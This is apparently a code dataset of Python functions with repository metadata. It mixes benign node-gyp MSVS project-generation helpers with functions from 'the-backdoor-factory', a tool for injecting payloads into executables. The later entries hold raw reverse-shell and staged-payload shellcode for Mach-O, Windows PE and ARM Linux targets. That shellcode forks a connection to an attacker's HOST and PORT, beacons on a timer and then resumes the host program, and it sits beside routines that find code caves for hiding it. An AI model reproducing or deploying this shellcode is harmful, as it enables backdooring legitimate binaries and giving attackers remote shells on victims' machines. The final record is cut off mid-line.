'%%(%s.Identity)' % rule.dirs_to_make,\n          'Condition': extension_condition\n         }\n        ],\n        ['Lib',\n         {'Include': '%%(%s.Identity)' % rule.dirs_to_make,\n          'Condition': extension_condition\n         }\n        ],\n        ['ImpLib',\n         {'Include': '%%(%s.Identity)' % rule.dirs_to_make,\n          'Condition': extension_condition\n         }\n        ],\n       ],\n       ['MakeDir',\n        {'Directories': (\"@(%s->'%%(RootDir)%%(Directory)')\" %\n                         rule.dirs_to_make)\n        }\n       ]\n      ],\n  ])\neasy_xml.WriteXmlIfChanged(content, targets_path, pretty=True, win32=True)", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Prepare list of sources and excluded sources.\n\nBesides the sources specified directly in the spec, adds the gyp file so\nthat a change to it will cause a re-compile. Also adds appropriate sources\nfor actions and copies. Assumes later stage will un-exclude files which\nhave custom build steps attached.\n\nArguments:\n  spec: The target dictionary containing the properties of the target.\n  gyp_file: The name of the gyp file.\nReturns:\n  A pair of (list of sources, list of excluded sources).\n  The sources will be relative to the gyp file.\n\"\"\"\n", "func_signal": "def _PrepareListOfSources(spec, generator_flags, gyp_file):\n", "code": "sources = OrderedSet()\n_AddNormalizedSources(sources, spec.get('sources', []))\nexcluded_sources = OrderedSet()\n# Add in the gyp file.\nif not generator_flags.get('standalone'):\n  sources.add(gyp_file)\n\n# Add in 'action' inputs and outputs.\nfor a in spec.get('actions', []):\n  inputs = a['inputs']\n  inputs = [_NormalizedSource(i) for i in inputs]\n  # Add all inputs to sources and excluded sources.\n  inputs = OrderedSet(inputs)\n  sources.update(inputs)\n  if not spec.get('msvs_external_builder'):\n    excluded_sources.update(inputs)\n  if int(a.get('process_outputs_as_sources', False)):\n    _AddNormalizedSources(sources, a.get('outputs', []))\n# Add in 'copies' inputs and outputs.\nfor cpy in spec.get('copies', []):\n  _AddNormalizedSources(sources, cpy.get('files', []))\nreturn (sources, excluded_sources)", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Escapes a Windows command-line argument for use by MSBuild.\"\"\"\n\n", "func_signal": "def _EscapeCommandLineArgumentForMSBuild(s):\n", "code": "def _Replace(match):\n  return (len(match.group(1)) / 2 * 4) * '\\\\' + '\\\\\"'\n\n# Escape all quotes so that they are interpreted literally.\ns = quote_replacer_regex2.sub(_Replace, s)\nreturn s", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Generate the .props file.\"\"\"\n", "func_signal": "def _GenerateMSBuildRulePropsFile(props_path, msbuild_rules):\n", "code": "content = ['Project',\n           {'xmlns': 'http://schemas.microsoft.com/developer/msbuild/2003'}]\nfor rule in msbuild_rules:\n  content.extend([\n      ['PropertyGroup',\n       {'Condition': \"'$(%s)' == '' and '$(%s)' == '' and \"\n        \"'$(ConfigurationType)' != 'Makefile'\" % (rule.before_targets,\n                                                  rule.after_targets)\n       },\n       [rule.before_targets, 'Midl'],\n       [rule.after_targets, 'CustomBuild'],\n      ],\n      ['PropertyGroup',\n       [rule.depends_on,\n        {'Condition': \"'$(ConfigurationType)' != 'Makefile'\"},\n        '_SelectedFiles;$(%s)' % rule.depends_on\n       ],\n      ],\n      ['ItemDefinitionGroup',\n       [rule.rule_name,\n        ['CommandLineTemplate', rule.command],\n        ['Outputs', rule.outputs],\n        ['ExecutionDescription', rule.description],\n        ['AdditionalDependencies', rule.additional_dependencies],\n       ],\n      ]\n  ])\neasy_xml.WriteXmlIfChanged(content, props_path, pretty=True, win32=True)", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Adds a configuration to the MSVS project.\n\nMany settings in a vcproj file are specific to a configuration.  This\nfunction the main part of the vcproj file that's configuration specific.\n\nArguments:\n  p: The target project being generated.\n  spec: The target dictionary containing the properties of the target.\n  config_type: The configuration type, a number as defined by Microsoft.\n  config_name: The name of the configuration.\n  config: The dictionary that defines the special processing to be done\n          for this configuration.\n\"\"\"\n# Get the information for this configuration\n", "func_signal": "def _AddConfigurationToMSVSProject(p, spec, config_type, config_name, config):\n", "code": "include_dirs, midl_include_dirs, resource_include_dirs = \\\n    _GetIncludeDirs(config)\nlibraries = _GetLibraries(spec)\nlibrary_dirs = _GetLibraryDirs(config)\nout_file, vc_tool, _ = _GetOutputFilePathAndTool(spec, msbuild=False)\ndefines = _GetDefines(config)\ndefines = [_EscapeCppDefineForMSVS(d) for d in defines]\ndisabled_warnings = _GetDisabledWarnings(config)\nprebuild = config.get('msvs_prebuild')\npostbuild = config.get('msvs_postbuild')\ndef_file = _GetModuleDefinition(spec)\nprecompiled_header = config.get('msvs_precompiled_header')\n\n# Prepare the list of tools as a dictionary.\ntools = dict()\n# Add in user specified msvs_settings.\nmsvs_settings = config.get('msvs_settings', {})\nMSVSSettings.ValidateMSVSSettings(msvs_settings)\n\n# Prevent default library inheritance from the environment.\n_ToolAppend(tools, 'VCLinkerTool', 'AdditionalDependencies', ['$(NOINHERIT)'])\n\nfor tool in msvs_settings:\n  settings = config['msvs_settings'][tool]\n  for setting in settings:\n    _ToolAppend(tools, tool, setting, settings[setting])\n# Add the information to the appropriate tool\n_ToolAppend(tools, 'VCCLCompilerTool',\n            'AdditionalIncludeDirectories', include_dirs)\n_ToolAppend(tools, 'VCMIDLTool',\n            'AdditionalIncludeDirectories', midl_include_dirs)\n_ToolAppend(tools, 'VCResourceCompilerTool',\n            'AdditionalIncludeDirectories', resource_include_dirs)\n# Add in libraries.\n_ToolAppend(tools, 'VCLinkerTool', 'AdditionalDependencies', libraries)\n_ToolAppend(tools, 'VCLinkerTool', 'AdditionalLibraryDirectories',\n            library_dirs)\nif out_file:\n  _ToolAppend(tools, vc_tool, 'OutputFile', out_file, only_if_unset=True)\n# Add defines.\n_ToolAppend(tools, 'VCCLCompilerTool', 'PreprocessorDefinitions', defines)\n_ToolAppend(tools, 'VCResourceCompilerTool', 'PreprocessorDefinitions',\n            defines)\n# Change program database directory to prevent collisions.\n_ToolAppend(tools, 'VCCLCompilerTool', 'ProgramDataBaseFileName',\n            '$(IntDir)$(ProjectName)\\\\vc80.pdb', only_if_unset=True)\n# Add disabled warnings.\n_ToolAppend(tools, 'VCCLCompilerTool',\n            'DisableSpecificWarnings', disabled_warnings)\n# Add Pre-build.\n_ToolAppend(tools, 'VCPreBuildEventTool', 'CommandLine', prebuild)\n# Add Post-build.\n_ToolAppend(tools, 'VCPostBuildEventTool', 'CommandLine', postbuild)\n# Turn on precompiled headers if appropriate.\nif precompiled_header:\n  precompiled_header = os.path.split(precompiled_header)[1]\n  _ToolAppend(tools, 'VCCLCompilerTool', 'UsePrecompiledHeader', '2')\n  _ToolAppend(tools, 'VCCLCompilerTool',\n              'PrecompiledHeaderThrough', precompiled_header)\n  _ToolAppend(tools, 'VCCLCompilerTool',\n              'ForcedIncludeFiles', precompiled_header)\n# Loadable modules don't generate import libraries;\n# tell dependent projects to not expect one.\nif spec['type'] == 'loadable_module':\n  _ToolAppend(tools, 'VCLinkerTool', 'IgnoreImportLibrary', 'true')\n# Set the module definition file if any.\nif def_file:\n  _ToolAppend(tools, 'VCLinkerTool', 'ModuleDefinitionFile', def_file)\n\n_AddConfigurationToMSVS(p, spec, tools, config, config_type, config_name)", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Given the input file to which a rule applied, string substitute a path.\n\nArguments:\n  path: a path to string expand\n  input_file: the file to which the rule applied.\nReturns:\n  The string substituted path.\n\"\"\"\n", "func_signal": "def _RuleExpandPath(path, input_file):\n", "code": "path = path.replace('$(InputName)',\n                    os.path.splitext(os.path.split(input_file)[1])[0])\npath = path.replace('$(InputDir)', os.path.dirname(input_file))\npath = path.replace('$(InputExt)',\n                    os.path.splitext(os.path.split(input_file)[1])[1])\npath = path.replace('$(InputFileName)', os.path.split(input_file)[1])\npath = path.replace('$(InputPath)', input_file)\nreturn path", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Return a list of MSBuild targets for external builders.\n\nThe \"Build\" and \"Clean\" targets are always generated.  If the spec contains\n'msvs_external_builder_clcompile_cmd', then the \"ClCompile\" target will also\nbe generated, to support building selected C/C++ files.\n\nArguments:\n  spec: The gyp target spec.\nReturns:\n  List of MSBuild 'Target' specs.\n\"\"\"\n", "func_signal": "def _GetMSBuildExternalBuilderTargets(spec):\n", "code": "build_cmd = _BuildCommandLineForRuleRaw(\n    spec, spec['msvs_external_builder_build_cmd'],\n    False, False, False, False)\nbuild_target = ['Target', {'Name': 'Build'}]\nbuild_target.append(['Exec', {'Command': build_cmd}])\n\nclean_cmd = _BuildCommandLineForRuleRaw(\n    spec, spec['msvs_external_builder_clean_cmd'],\n    False, False, False, False)\nclean_target = ['Target', {'Name': 'Clean'}]\nclean_target.append(['Exec', {'Command': clean_cmd}])\n\ntargets = [build_target, clean_target]\n\nif spec.get('msvs_external_builder_clcompile_cmd'):\n  clcompile_cmd = _BuildCommandLineForRuleRaw(\n      spec, spec['msvs_external_builder_clcompile_cmd'],\n      False, False, False, False)\n  clcompile_target = ['Target', {'Name': 'ClCompile'}]\n  clcompile_target.append(['Exec', {'Command': clcompile_cmd}])\n  targets.append(clcompile_target)\n\nreturn targets", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Performs a partial deep-copy on |in_dict|, only copying the keys in |keys|.\n\nArguments:\n  in_dict: The dictionary to copy.\n  keys: The keys to be copied. If a key is in this list and doesn't exist in\n      |in_dict| this is not an error.\nReturns:\n  The partially deep-copied dictionary.\n\"\"\"\n", "func_signal": "def _DeepCopySomeKeys(in_dict, keys):\n", "code": "d = {}\nfor key in keys:\n  if key not in in_dict:\n    continue\n  d[key] = copy.deepcopy(in_dict[key])\nreturn d", "path": "StarsAndClown/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/MSVSUtil.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Returns the path and tool to use for this target.\n\nFigures out the path of the file this spec will create and the name of\nthe VC tool that will create it.\n\nArguments:\n  spec: The target dictionary containing the properties of the target.\nReturns:\n  A triple of (file path, name of the vc tool, name of the msbuild tool)\n\"\"\"\n# Select a name for the output file.\n", "func_signal": "def _GetOutputFilePathAndTool(spec, msbuild):\n", "code": "out_file = ''\nvc_tool = ''\nmsbuild_tool = ''\noutput_file_map = {\n    'executable': ('VCLinkerTool', 'Link', '$(OutDir)', '.exe'),\n    'shared_library': ('VCLinkerTool', 'Link', '$(OutDir)', '.dll'),\n    'loadable_module': ('VCLinkerTool', 'Link', '$(OutDir)', '.dll'),\n    'static_library': ('VCLibrarianTool', 'Lib', '$(OutDir)lib\\\\', '.lib'),\n}\noutput_file_props = output_file_map.get(spec['type'])\nif output_file_props and int(spec.get('msvs_auto_output_file', 1)):\n  vc_tool, msbuild_tool, out_dir, suffix = output_file_props\n  if spec.get('standalone_static_library', 0):\n    out_dir = '$(OutDir)'\n  out_dir = spec.get('product_dir', out_dir)\n  product_extension = spec.get('product_extension')\n  if product_extension:\n    suffix = '.' + product_extension\n  elif msbuild:\n    suffix = '$(TargetExt)'\n  prefix = spec.get('product_prefix', '')\n  product_name = spec.get('product_name', '$(ProjectName)')\n  out_file = ntpath.join(out_dir, prefix + product_name + suffix)\nreturn out_file, vc_tool, msbuild_tool", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "\"\"\"Returns the list of preprocessor definitions for this configuation.\n\nArguments:\n  config: The dictionary that defines the special processing to be done\n          for this configuration.\nReturns:\n  The list of preprocessor definitions.\n\"\"\"\n", "func_signal": "def _GetDefines(config):\n", "code": "defines = []\nfor d in config.get('defines', []):\n  if type(d) == list:\n    fd = '='.join([str(dpart) for dpart in d])\n  else:\n    fd = str(d)\n  defines.append(fd)\nreturn defines", "path": "StarsAndClown/node_modules/npmi/node_modules/npm/node_modules/node-gyp/gyp/pylib/gyp/generator/msvs.py", "commit_date": "2019-08-25 00:00:00", "repo_name": "zhaoolee/StarsAndClown", "stars": 2228, "license": "gpl-3.0", "language": "python", "size": 40265}
{"docstring": "'''\nThis parses a .rsrc section for quick modification\n'''\n", "func_signal": "def parse_rsrc(self):\n", "code": "self.rsrc_structure = {}\n\ndef parse_header():\n    return {\"Characteristics\": struct.unpack(\"<I\", self.binary.read(4))[0],\n            \"TimeDataStamp\": struct.unpack(\"<I\", self.binary.read(4))[0],\n            \"MajorVersion\": struct.unpack(\"<H\", self.binary.read(2))[0],\n            \"MinorVersion\": struct.unpack(\"<H\", self.binary.read(2))[0],\n            \"NumberOfNamedEntries\": struct.unpack(\"<H\", self.binary.read(2))[0],\n            \"NumberofIDEntries\": struct.unpack(\"<H\", self.binary.read(2))[0],\n            }\n\ndef merge_two_dicts(x, y):\n    '''Given two dicts, merge them into a new dict as a shallow copy.'''\n    z = x.copy()\n    z.update(y)\n    return z\n\ndef parse_data_entry():\n    return {\"WriteME\": self.binary.tell(),\n            \"RVA of Data\": struct.unpack(\"<I\", self.binary.read(4))[0],\n            \"Size\": struct.unpack(\"<I\", self.binary.read(4))[0],\n            \"CodePage\": struct.unpack(\"<I\", self.binary.read(4))[0],\n            \"Reserved\": struct.unpack(\"<I\", self.binary.read(4))[0]\n            }\n\ndef parse_ID(number):\n    temp = {}\n    for i in range(0, number):\n        _tempid = struct.unpack(\"<I\", self.binary.read(4))[0]\n        temp[_tempid] = struct.unpack(\"<I\", self.binary.read(4))[0]\n    return temp\n\n#parse initial header\nif \"rsrcPointerToRawData\" not in self.flItms:\n    return False\nself.binary.seek(self.flItms['rsrcPointerToRawData'], 0)\nself.rsrc_structure['Typeheader'] = parse_header()\nself.rsrc_structure['Typeheader']['NameEntries'] = {}\nself.rsrc_structure['Typeheader'][\"IDentries\"] = {}\n\nif self.rsrc_structure['Typeheader'][\"NumberofIDEntries\"]:\n    self.rsrc_structure['Typeheader'][\"IDentries\"] = parse_ID(self.rsrc_structure['Typeheader'][\"NumberofIDEntries\"])\nif self.rsrc_structure['Typeheader'][\"NumberOfNamedEntries\"]:\n    self.rsrc_structure['Typeheader']['NameEntries'] = parse_ID(self.rsrc_structure['Typeheader']['NumberOfNamedEntries'])\n\n#merge, flatten\nself.rsrc_structure['Typeheader']['Entries'] = merge_two_dicts(self.rsrc_structure['Typeheader'][\"IDentries\"],\n                                                               self.rsrc_structure['Typeheader']['NameEntries'])\n\nfor entry, value in self.rsrc_structure['Typeheader'][\"Entries\"].iteritems():\n    if entry == 24:  # 24 is the Manifest resource\n        self.binary.seek(self.flItms['rsrcPointerToRawData'] + (value & 0xffffff), 0)\n\n        self.rsrc_structure[entry] = parse_header()\n        self.rsrc_structure[entry][\"IDs\"] = {}\n        self.rsrc_structure[entry][\"Names\"] = {}\n\n        if self.rsrc_structure[entry][\"NumberofIDEntries\"]:\n            self.rsrc_structure[entry][\"IDs\"] = parse_ID(self.rsrc_structure[entry][\"NumberofIDEntries\"])\n\n        if self.rsrc_structure[entry][\"NumberOfNamedEntries\"]:\n            self.rsrc_structure[entry][\"Names\"] = parse_ID(self.rsrc_structure[entry][\"NumberOfNamedEntries\"])\n\n        self.rsrc_structure[entry][\"NameIDs\"] = merge_two_dicts(self.rsrc_structure[entry][\"IDs\"],\n                                                                self.rsrc_structure[entry][\"Names\"])\n\n        #Now get language\n        for name_id, offset in self.rsrc_structure[entry][\"NameIDs\"].iteritems():\n            self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offset & 0xffffff), 0)\n            self.rsrc_structure[name_id] = parse_header()\n            self.rsrc_structure[name_id][\"IDs\"] = {}\n            self.rsrc_structure[name_id][\"Names\"] = {}\n\n            if self.rsrc_structure[name_id][\"NumberofIDEntries\"]:\n                self.rsrc_structure[name_id][\"IDs\"] = parse_ID(self.rsrc_structure[name_id][\"NumberofIDEntries\"])\n\n            if self.rsrc_structure[name_id][\"NumberOfNamedEntries\"]:\n                self.rsrc_structure[name_id][\"Names\"] = parse_ID(self.rsrc_structure[name_id][\"NumberOfNamedEntries\"])\n\n            self.rsrc_structure[name_id][\"language\"] = merge_two_dicts(self.rsrc_structure[name_id][\"IDs\"],\n                                                                       self.rsrc_structure[name_id][\"Names\"])\n\n            #now get Data Entry Details and write\n            for lanID, offsetDataEntry in self.rsrc_structure[name_id][\"language\"].iteritems():\n                self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offsetDataEntry & 0xffffff), 0)\n                self.rsrc_structure[lanID] = parse_data_entry()\n            #Jump to Manifest\n            self.flItms['manifestLOC'] = (self.flItms['rsrcPointerToRawData'] +\n                                         (self.rsrc_structure[lanID][\"RVA of Data\"] -\n                                          self.flItms['rsrcVirtualAddress']))\n\n            return True\nreturn False", "path": "the-backdoor-factory/pebin.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "#could take this out HOST/PORT and put into each shellcode function\n", "func_signal": "def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):\n", "code": "self.HOST = HOST\nself.PORT = PORT\nself.shellcode = \"\"\nself.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE\nself.stackpreserve = \"\\x90\\x90\\x60\\x9c\"\nself.stackrestore = \"\\x9d\\x61\"\nself.apis_needed = None", "path": "the-backdoor-factory/intel/WinIntelPE32.py", "commit_date": "2017-02-07 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "#Modified from metasploit\n", "func_signal": "def reverse_shell_tcp(self):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    return False\nif self.HOST is None:\n    print (\"This payload requires a HOST parameter -H\")\n    return False\n\nself.shellcode2 = \"\\x68\"\nself.shellcode2 += self.pack_ip_addresses()\nself.shellcode2 += \"\\x68\\xff\\x02\"\nself.shellcode2 += struct.pack(\">H\", self.PORT)\nself.shellcode2 += (\"\\x89\\xe7\\x31\\xc0\\x50\"\n                    \"\\x6a\\x01\\x6a\\x02\\x6a\\x10\\xb0\\x61\\xcd\\x80\\x57\\x50\\x50\\x6a\\x62\"\n                    \"\\x58\\xcd\\x80\\x50\\x6a\\x5a\\x58\\xcd\\x80\\xff\\x4f\\xe8\\x79\\xf6\\x68\"\n                    \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x54\\x53\"\n                    \"\\x50\\xb0\\x3b\\xcd\\x80\"\n                    )\n\nself.shellcode1 = (\"\\xB8\\x02\\x00\\x00\\x02\\xcd\\x80\\x85\\xd2\")\nself.shellcode1 += \"\\x0f\\x84\"\nif self.jumpLocation < 0:\n    self.shellcode1 += struct.pack(\"<I\", len(self.shellcode1) + 0xffffffff + self.jumpLocation)\nelse:\n    self.shellcode1 += struct.pack(\"<I\", len(self.shellcode2) + self.jumpLocation)\n\nself.shellcode = self.shellcode1 + self.shellcode2\nreturn (self.shellcode1 + self.shellcode2)", "path": "the-backdoor-factory/intel/MachoIntel32.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"\nOutput file check.\n\"\"\"\n", "func_signal": "def output_options(self):\n", "code": "if not self.OUTPUT:\n    self.OUTPUT = os.path.basename(self.FILE)", "path": "the-backdoor-factory/pebin.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"\nFOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER\nModified metasploit payload/linux/armle/shell/reverse_tcp\nto correctly fork the shellcode payload and contiue normal execution.\n\"\"\"\n", "func_signal": "def reverse_tcp_stager(self, CavesPicked={}):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    sys.exit(1)\n\n#FORK\nself.shellcode1 = \"\\x00\\x40\\xa0\\xe1\"   # mov r4, r0 \nself.shellcode1 += \"\\x00\\x00\\x40\\xe0\"   # sub r0, r0, r0\nself.shellcode1 += \"\\x02\\x70\\xa0\\xe3\"   # mov r7, #2\nself.shellcode1 += \"\\x00\\x00\\x00\\xef\"   # scv 0\nself.shellcode1 += \"\\x00\\x00\\x50\\xe3\"   # cmp r0, #\nself.shellcode1 += \"\\x04\\x00\\xa0\\xe1\"   # mov r0, r4\nself.shellcode1 += \"\\x04\\x40\\x44\\xe0\"   # sub r4, r4, r4\nself.shellcode1 += \"\\x00\\x70\\xa0\\xe3\"   # mov r7, #0\nself.shellcode1 += \"\\x00\\x00\\x00\\x0a\"   # beq to shellcode\n# JMP Address = (entrypoint - currentaddress -8)/4\njmpAddr = 0xffffff + (self.e_entry -(self.shellcode_vaddr +len(self.shellcode1)) - 4)/4\nself.shellcode1 += (struct.pack(\"<I\", jmpAddr)).strip(\"\\x00\")\nself.shellcode1 += \"\\xea\"   #b entrypoint\n\n#SHELLCODE\nself.shellcode1 += (\"\\xb4\\x70\\x9f\\xe5\\x02\\x00\\xa0\\xe3\\x01\\x10\\xa0\\xe3\\x06\\x20\\xa0\"\n                    \"\\xe3\\x00\\x00\\x00\\xef\\x00\\xc0\\xa0\\xe1\\x02\\x70\\x87\\xe2\\x90\\x10\"\n                    \"\\x8f\\xe2\\x10\\x20\\xa0\\xe3\\x00\\x00\\x00\\xef\\x0c\\x00\\xa0\\xe1\\x04\"\n                    \"\\xd0\\x4d\\xe2\\x08\\x70\\x87\\xe2\\x0d\\x10\\xa0\\xe1\\x04\\x20\\xa0\\xe3\"\n                    \"\\x00\\x30\\xa0\\xe3\\x00\\x00\\x00\\xef\\x00\\x10\\x9d\\xe5\\x70\\x30\\x9f\"\n                    \"\\xe5\\x03\\x10\\x01\\xe0\\x01\\x20\\xa0\\xe3\\x02\\x26\\xa0\\xe1\\x02\\x10\"\n                    \"\\x81\\xe0\\xc0\\x70\\xa0\\xe3\\x00\\x00\\xe0\\xe3\\x07\\x20\\xa0\\xe3\\x54\"\n                    \"\\x30\\x9f\\xe5\\x00\\x40\\xa0\\xe1\\x00\\x50\\xa0\\xe3\\x00\\x00\\x00\\xef\"\n                    \"\\x63\\x70\\x87\\xe2\\x00\\x10\\xa0\\xe1\\x0c\\x00\\xa0\\xe1\\x00\\x30\\xa0\"\n                    \"\\xe3\\x00\\x20\\x9d\\xe5\\xfa\\x2f\\x42\\xe2\\x00\\x20\\x8d\\xe5\\x00\\x00\"\n                    \"\\x52\\xe3\\x02\\x00\\x00\\xda\\xfa\\x2f\\xa0\\xe3\\x00\\x00\\x00\\xef\\xf7\"\n                    \"\\xff\\xff\\xea\\xfa\\x2f\\x82\\xe2\\x00\\x00\\x00\\xef\\x01\\xf0\\xa0\\xe1\"\n                    \"\\x02\\x00\")\nself.shellcode1 += struct.pack('!H', self.PORT)\nself.shellcode1 += self.pack_ip_addresses()\nself.shellcode1 += \"\\x19\\x01\\x00\\x00\\x00\\xf0\\xff\\xff\\x22\\x10\\x00\\x00\"\n\nself.shellcode = self.shellcode1\nreturn (self.shellcode1)", "path": "the-backdoor-factory/arm/LinuxARMLELF32.py", "commit_date": "2014-07-31 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"\nSample code for finding sutable code caves\n\"\"\"\n", "func_signal": "def cave_miner_inline(self, flItms, CavesPicked={}):\n", "code": "breakupvar = eat_code_caves(flItms, 0, 1)\nself.shellcode1 = \"\"\n\nif flItms['cave_jumping'] is True:\n    self.shellcode1 += \"\\xe9\"\n    if breakupvar > 0:\n        if len(self.shellcode1) < breakupvar:\n            self.shellcode1 += struct.pack(\"<I\", int(str(hex(breakupvar - len(self.stackpreserve) -\n                                                         len(self.shellcode1) - 4).rstrip(\"L\")), 16))\n        else:\n            self.shellcode1 += struct.pack(\"<I\", int(str(hex(len(self.shellcode1) -\n                                                     breakupvar - len(self.stackpreserve) - 4).rstrip(\"L\")), 16))\n    else:\n            self.shellcode1 += struct.pack(\"<I\", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -\n                                           len(self.shellcode1) - 3)\n#else:\n#    self.shellcode1 += \"\\x89\\x00\\x00\\x00\"\n\nself.shellcode1 += (\"\\x90\" * 40\n                    )\n\nself.shellcode2 = (\"\\x90\" * 48\n                   )\n\nself.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore\nreturn (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)", "path": "the-backdoor-factory/intel/WinIntelPE32.py", "commit_date": "2017-02-07 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "#could take this out HOST/PORT and put into each shellcode function\n", "func_signal": "def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None, shellcode_vaddr=0x0):\n", "code": "self.HOST = HOST\nself.PORT = PORT\nself.e_entry = e_entry\nself.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE\nself.shellcode = \"\"\nself.shellcode_vaddr = shellcode_vaddr", "path": "the-backdoor-factory/arm/LinuxARMLELF32.py", "commit_date": "2014-07-31 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "# REQUIRED -- exposes BDF objects to the preprocessor environment\n", "func_signal": "def __init__(self, BDF):\n", "code": "        self.BDF = BDF\n        # You can set a return, just add a check that returns False\n        # 'None' does not flag\n        self.result = True", "path": "the-backdoor-factory/preprocessor/debug.py", "commit_date": "2016-06-19 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "#Modified from metasploit\n", "func_signal": "def beaconing_reverse_shell_tcp(self):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    return False\nif self.HOST is None:\n    print (\"This payload requires a HOST parameter -H\")\n    return False\n\nself.shellcode2 = \"\\xB8\\x02\\x00\\x00\\x02\\xcd\\x80\\x85\\xd2\"  # FORK\n#fork\nself.shellcode2 += \"\\x0f\\x84\"                             # TO TIME CHECK\nself.shellcode2 += \"\\x41\\x00\\x00\\x00\"\n\nself.shellcode2 += \"\\x68\"\nself.shellcode2 += self.pack_ip_addresses()\nself.shellcode2 += \"\\x68\\xff\\x02\"\nself.shellcode2 += struct.pack(\">H\", self.PORT)\nself.shellcode2 += (\"\\x89\\xe7\\x31\\xc0\\x50\"\n                    \"\\x6a\\x01\\x6a\\x02\\x6a\\x10\\xb0\\x61\\xcd\\x80\\x57\\x50\\x50\\x6a\\x62\"\n                    \"\\x58\\xcd\\x80\\x50\\x6a\\x5a\\x58\\xcd\\x80\\xff\\x4f\\xe8\\x79\\xf6\\x68\"\n                    \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x54\\x53\"\n                    \"\\x50\\xb0\\x3b\\xcd\\x80\"\n                    )\n\n#Time Check\nself.shellcode2 += \"\\xB8\\x74\\x00\\x00\\x02\\xcd\\x80\"   # put system time in eax\nself.shellcode2 += \"\\x05\"                           # add eax, 15  for seconds\nself.shellcode2 += struct.pack(\"<I\", self.BEACON)\nself.shellcode2 += (\"\\x89\\xC3\"                      # mov ebx, eax\n                    \"\\xB8\\x74\\x00\\x00\\x02\\xcd\\x80\"  # put system time in eax\n                    \"\\x39\\xD8\"                      # cmp eax, ebx\n                    \"\\x0F\\x85\\xf1\\xff\\xff\\xff\"      # jne back to system time\n                    \"\\xe9\\x8E\\xff\\xff\\xff\\xff\"      # jmp back to FORK\n                    )\n\n#FORK to main program\nself.shellcode1 = 